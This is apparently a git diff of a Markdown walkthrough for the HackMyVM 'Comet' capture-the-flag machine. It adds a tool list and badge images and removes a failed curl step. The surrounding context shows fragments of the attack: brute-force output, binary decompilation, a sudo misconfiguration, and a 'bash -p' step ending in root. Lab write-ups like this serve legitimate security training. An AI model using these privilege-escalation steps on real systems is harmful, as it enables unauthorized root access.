@@ -12,9 +12,19 @@
 
 <img src="https://hackmyvm.eu/img/vm/comet.png" alt="Comet Machine Logo" width="150"/>
 
+#### Tools Used
+
+- Ghidra
+- Gobuster
+- Hydra
+- IDA
+- John the Ripper
+- Nmap
+- Wfuzz
+
 #### Machine Writeup
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ifconfig`:
 ```
@@ -163,11 +173,6 @@ Progress: 1453501 / 1453508 (100.00%)
 Finished
 ===============================================================
 ```
-
-`curl http://192.168.56.113/ip.txt`:
-```
-```
-❌ Failed Step.
 
 `curl http://192.168.56.113/login.php`:
 ```html
@@ -430,7 +435,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 🔄 Alternative Step.
 
-`ghidra`, `Import File: ./firewall_update`:
+`ghidra` > `Import File: ./firewall_update`:
 ```
 undefined8 main(void)
 
@@ -610,7 +615,7 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>joe</code> }</b></span>
+![Victim: joe](https://img.shields.io/badge/Victim-joe-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
@@ -673,7 +678,7 @@ User joe may run the following commands on comet:
     (ALL : ALL) NOPASSWD: /bin/bash /home/joe/coll ←
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `echo "HMV" | tee -a ./file`:
 ```
@@ -707,7 +712,7 @@ joe@192.168.56.113's password:
 file2                                          100%  192    67.5KB/s   00:00 ←    
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>joe</code> }</b></span>
+![Victim: joe](https://img.shields.io/badge/Victim-joe-64b5f6?logo=linux&logoColor=white)
 
 `ls -alps`:
 ```
@@ -744,7 +749,7 @@ f46d6ec08c68cb48fe098307863e85b6  file2 ←
 
 `bash -p`
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>root</code> }</b></span>
+![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
